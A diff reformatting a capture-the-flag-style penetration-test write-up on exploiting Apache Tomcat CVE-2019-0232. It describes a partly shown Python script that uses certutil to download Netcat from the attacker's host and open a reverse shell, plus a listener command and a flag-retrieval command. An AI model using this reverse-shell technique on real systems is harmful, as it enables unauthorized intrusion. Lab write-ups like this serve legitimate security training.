@@ -31,10 +31,7 @@ Exploiting Apache Tomcat CVE-2019-0232
 To exploit the vulnerability in Apache Tomcat, I used a custom Python script that leverages the certutil tool to download and execute Netcat on the target machine. This allows the attacker to obtain a reverse shell and gain control of the system.
 
 Below is the script I used for exploitation:
-
-python
-Copy
-Edit
+```bash
 #!/usr/bin/env python3
 import time
 import requests
@@ -61,31 +58,28 @@ try:
     print("[+] Reverse shell payload executed successfully.")
 except Exception as e:
     print(f"Some error occurred: {str(e)}")
-Explanation of the Script:
+```
+**Explanation of the Script:**
 
-Payload URL 1: This URL triggers the cmd.bat script on the Tomcat server and uses certutil to download Netcat (nc.exe) from the attacker's server.
+**Payload URL 1**: This URL triggers the cmd.bat script on the Tomcat server and uses certutil to download Netcat (nc.exe) from the attacker's server.
 
-Payload URL 2: This second URL executes the downloaded Netcat and establishes a reverse shell back to the attacker's machine on port 1234.
+**Payload URL 2**: This second URL executes the downloaded Netcat and establishes a reverse shell back to the attacker's machine on port 1234.
 
-Setting Up the Listener
+## Setting Up the Listener
 Before running the exploit script, I set up a Netcat listener on my local machine to receive the reverse shell connection:
-
-bash
-Copy
-Edit
+```bash
 nc -lvnp 1234
+```
 Once the script successfully executed the reverse shell payload, a connection was established to my listener, granting me access to the target machine.
 
-Gaining Access and Retrieving the Flag
+## Gaining Access and Retrieving the Flag
 With the reverse shell established, I was able to navigate the system's file structure. The goal was to find the flag.txt file, which was located on the Administrator's desktop. Using the following command, I accessed the file:
-
-bash
-Copy
-Edit
+```bash
 cat C:\Users\Administrator\Desktop\flag.txt
-The contents of the flag.txt file were successfully retrieved and submitted to complete the assessment.
+```
+The contents of the `flag.txt` file were successfully retrieved and submitted to complete the assessment.
 
-Conclusion
+## Conclusion
 This penetration test demonstrated how an attacker could exploit a vulnerability in Apache Tomcat to gain unauthorized access to a system. By identifying the CVE-2019-0232 vulnerability in the target's Tomcat instance, I was able to leverage a custom script to execute arbitrary commands and gain a reverse shell. Once access was obtained, I was able to retrieve the flag.txt file and complete the skills assessment.
 
 The process highlights the importance of keeping web application servers like Apache Tomcat up to date with security patches, as well as securing services from unauthorized access by applying the principle of least privilege and isolating sensitive systems.
